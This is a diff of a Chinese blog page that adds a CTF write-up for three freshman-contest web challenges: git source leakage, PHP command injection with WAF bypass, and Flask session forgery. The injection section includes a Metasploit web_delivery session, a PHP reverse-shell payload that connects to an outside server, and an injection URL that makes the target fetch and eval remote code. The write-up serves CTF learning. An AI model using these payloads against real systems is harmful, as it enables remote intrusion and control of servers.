@@ -7,7 +7,7 @@
 
     
 
-    <title>categories | 2h0nG&#39;s Blog</title>
+    <title>2020Geek11th新生赛 | 2h0nG&#39;s Blog</title>
     <meta name="author" content="John Doe">
     
     <meta name="description" content="Love is friendship fell into love">
@@ -15,7 +15,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    <meta property="og:title" content="categories"/>
+    <meta property="og:title" content="2020Geek11th新生赛"/>
     <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
 
     
@@ -262,6 +262,10 @@
         <span class="breadcrumb">当前位置（分类目录）</span>
         
             
+    
+    
+    <a class="breadcrumb" href="/categories/CTF笔记/">CTF笔记</a>
+
 
         
 
@@ -277,12 +281,12 @@
             <div class="article-title">
                 
     
-        <h1>categories</h1>
+        <h1>2020Geek11th新生赛</h1>
     
 
 
             </div>
-            <time class="pink-link-context" datetime="2020-07-31T14:16:25.000Z"><a href="/categories/index.html">2020-07-31</a></time>
+            <time class="pink-link-context" datetime="2020-10-22T15:57:00.000Z"><a href="/2020/10/22/CTF%E7%AC%94%E8%AE%B0/2020Geek11th%E6%96%B0%E7%94%9F%E8%B5%9B/">2020-10-22</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -290,16 +294,86 @@
 </span>
 
             
+    <div class="tags-row">
+        
+            <a href="/tags/CTF笔记/" class="chip pink lighten-1">CTF笔记</a>
+        
+    </div>
+
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2020Geek11th%E6%96%B0%E7%94%9F%E8%B5%9B"><span class="section table-of-contents-text">2020Geek11th新生赛</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#EZgit"><span class="section table-of-contents-text">EZgit</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E7%9F%A5X%E5%A0%82%E7%9A%84php%E6%95%99%E7%A8%8B"><span class="section table-of-contents-text">知X堂的php教程</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%BF%8F%E6%82%94%E7%9A%84%E5%88%98%E5%A3%AE"><span class="section table-of-contents-text">忏悔的刘壮</span></a></li></ol></li></ol>
 </div>
 
 
             <div class="entry pink-link-context">
-                
-                
+                <h2 id="2020Geek11th新生赛"><a href="#2020Geek11th新生赛" class="headerlink" title="2020Geek11th新生赛"></a>2020Geek11th新生赛</h2><p>自己菜的像🐕，只好从新生赛打起了…</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://shimo.im/docs/TwvhXT3HKDpQVgR6/read">https://shimo.im/docs/TwvhXT3HKDpQVgR6/read</a></p>
+</blockquote>
+<h3 id="EZgit"><a href="#EZgit" class="headerlink" title="EZgit"></a>EZgit</h3><p>git源码泄露 + commit版本切换</p>
+<p><strong>脚本：GitHacker</strong> 由王一航大佬开发。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/WangYihang/GitHacker.git">https://github.com/WangYihang/GitHacker.git</a></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python GitHacker.py http://47.100.46.169:3902/.git/    <span class="comment">#获得源码+.git</span></span><br><span class="line">git <span class="built_in">log</span> --reflog    <span class="comment">#查看历史提交日志</span></span><br><span class="line">git reset --hard ID    <span class="comment">#切换版本到对应历史提交版本，ID为日志中的commit ID</span></span><br><span class="line"><span class="comment">#flag就在对应历史版本中的源码里</span></span><br></pre></td></tr></table></figure>
 
+<p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20201018124542219.png" alt="image-20201018124542219"></p>
+<h3 id="知X堂的php教程"><a href="#知X堂的php教程" class="headerlink" title="知X堂的php教程"></a>知X堂的php教程</h3><p>​    这道题首先通过URI资源名和效果判断出后台接口可以任意读文件以及目录遍历，因此可通过其接口得到源码，下一步就是审计源码了。</p>
+<p>​    审计源码，猜测是listdir.php种的ls代码注入，尝试<code>;ls</code>注入，发现没有预期结果，通过Wappalyzer识别服务器架构为Ubuntu操作系统，所以搭建Ubuntu环境测试源码注入情况。</p>
+<p>​    Ubuntu下载apache2后发现无PHP环境，需要下载php与apache2的php模块库</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php</span><br><span class="line">sudo apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure>
+
+<p>​    经过尝试后，发现没有预期结果的原因是传入的<code>;ls</code>是search_dir变量，很明显，$search_dir无论如何拼接<code>/</code>和<code>item</code>都是sh无法通过is_file()，因为明显没有目录名叫<code>;ls</code>。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( is_file(<span class="variable">$search_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$item</span>) AND substr(<span class="variable">$item</span>, 0, 1) != <span class="string">&#x27;.&#x27;</span> )</span><br></pre></td></tr></table></figure>
+
+<p>​    所以其实代码通过<code>；</code>是可以注入的，只不过无回显，下一步的主要思路就是绕过waf.php来实现一个shell反弹，拿到flag。</p>
+<p>​    waf利用正则表达式过滤了<code>&lt;&gt;|&amp;</code>，因此常规的反弹shell不行，因为重定向符被过滤了。通过源码的任意读文件，上网查了一下获得shell的多种方法，其实python就可以，可惜靶机中无python。另外发现msf获得shell的方法很清奇：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> target 1</span><br><span class="line">target =&gt; 1</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> lhost 192.168.118.128</span><br><span class="line">lhost =&gt; 192.168.118.128</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> SRVPORT  8888</span><br><span class="line">SRVPORT =&gt; 8888</span><br><span class="line">msf exploit(web_delivery) &gt; run</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"> </span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.128:6666</span><br><span class="line">[*] Using URL: http://0.0.0.0:8888/mDIK5UGRA8Qs76</span><br><span class="line">[*] Local IP: http://192.168.118.128:8888/mDIK5UGRA8Qs76</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">php -d allow_url_fopen=<span class="literal">true</span> -r <span class="string">&quot;eval(file_get_contents(&#x27;http://192.168.118.128:8888/mDIK5UGRA8Qs76&#x27;));&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    首先是msf开启了一个8888服务，并且生成了一个文件内容，最后由php程序通过eval去包含且执行它。这里php的骚操作让俺长了见识，尽管咱云服务器上无msf，但是咱们可以举一反三，在云上弄个文件带上php反弹shell的payload，再让它包含不就完事儿了嘛！原理就是这样。另外，这里的骚操作php -d 让俺也涨了见识，-d参数可以进行一个临时配置，这里是开启了url文件包含的选项，让其php进程可以包含俺云服务器上的资源。最后，我在云服务器上/var/www/html中写入了一个gogo.php（没错，俺就是直接用的web服务），内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sock=fsockopen(<span class="string">&quot;123.57.95.65&quot;</span>,<span class="number">2333</span>);exec(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​    这是比较典型的php反弹shell的payload。so，完事具备，代码注入一波就好！云服务器端开启一波2333端口监听，<code>nc -nlvp</code> 2333，然后注入。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://47.94.239.194:8082/listdir.php?dirname=.;php%20<span class="_">-d</span>%20allow_url_fopen=<span class="literal">true</span>%20-r%20%22eval(file_get_contents(%27http://123.57.95.65:80/gogo.php%27));%22</span><br><span class="line">+++++++++++++++++++++以上内容如下++++++++++++++++++++++</span><br><span class="line">http://47.94.239.194:8082/listdir.php?dirname=.;php -d allow_url_fopen=<span class="literal">true</span> -r <span class="string">&quot;eval(file_get_contents(&#x27;http://123.57.95.65:80/gogo.php&#x27;));&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    此时云服务器监听终端有反应啦，成功拿下shell，<code>find / -name flag</code>一波，找到位置<code>/flagggggggggggggg_1s_here/flag</code>，cat即可！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;Mak3_ZXT_sh*t_4oreVer&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="忏悔的刘壮"><a href="#忏悔的刘壮" class="headerlink" title="忏悔的刘壮"></a>忏悔的刘壮</h3><p>审题发现应该是与python flask框架的session有关的题目，然后在网上检索关于flask的session相关CTF题。</p>
+<blockquote>
+<p>由于 <strong>flask</strong> 是非常轻量级的 <strong>Web框架</strong> ，其 <strong>session</strong> 存储在客户端中（可以通过HTTP请求头Cookie字段的session获取），且仅对 <strong>session</strong> 进行了签名，缺少数据防篡改实现，这便很容易存在安全漏洞。</p>
+</blockquote>
+<p>flask session的组成结构：<code>json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code></p>
+<p>例如：<code>eyJkb25lX3RpbWVzIjowfQ.X5JVng.5U6uWBp6V-g98elViadcYHwP3yc</code></p>
+<p>​    发现了其考点可能为爆破session的密钥secret_key，来进行伪造session_id。这里使用<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign.git">flask-unsign</a>开源PY脚本，首先</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign.exe --decode --cookie <span class="string">&#x27;eyJkb25lX3RpbWVzIjowfQ.X5JVng.5U6uWBp6V-g98elViadcYHwP3yc&#x27;</span></span><br><span class="line"></span><br><span class="line">得到session中的json内容:&#123;<span class="string">&#x27;done_times&#x27;</span>: 0&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BAdxFP"><img src="https://s1.ax1x.com/2020/10/23/BAdxFP.png" alt="BAdxFP.png"></a></p>
+<p>然后再尝试爆破其secret_key：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie <span class="string">&#x27;eyJkb25lX3RpbWVzIjowfQ.X5JVng.5U6uWBp6V-g98elViadcYHwP3yc&#x27;</span></span><br><span class="line"></span><br><span class="line">得到secret key：<span class="string">&#x27;abc&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BAweYV"><img src="https://s1.ax1x.com/2020/10/23/BAweYV.png" alt="BAweYV.png"></a></p>
+<p>OK，我们得到了伪造session id的手段，尝试进行伪造，json内容为”{‘done_times’: 100}”，伪造方法同样使用flask-unsign脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie <span class="string">&quot;&#123;&#x27;done_times&#x27;: 10&#125;&quot;</span> --secret <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"></span><br><span class="line">伪造结果：eyJkb25lX3RpbWVzIjoxMH0.X5J7yQ.0mXdmM9UPFAgmW4SlEqkoYJIx00</span><br></pre></td></tr></table></figure>
+
+<p>尝试将伪造出的session id存入浏览器，再次访问一下do_answer页面，发现done_times的值10被回显到了前端！怀疑存在SSTI模板注入！</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BA0pA1"><img src="https://s1.ax1x.com/2020/10/23/BA0pA1.png" alt="BA0pA1.png"></a></p>
+
+                
+<p class="pink-link-context">
+    <a href="/2020/10/23/CTF%E7%AC%94%E8%AE%B0/%E5%9C%A8bp%E4%B8%AD%E5%AE%89%E8%A3%85tplmap%E6%8B%93%E5%B1%95/" rel="next" title="在bp中安装tplmap拓展">
+    上一篇：在bp中安装tplmap拓展
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/2020/10/21/CTF%E7%AC%94%E8%AE%B0/SQLi-lab/" rel="next" title="SQLi-labs">
+    下一篇：SQLi-labs
+  </a>
+</p>
 
 
             </div>
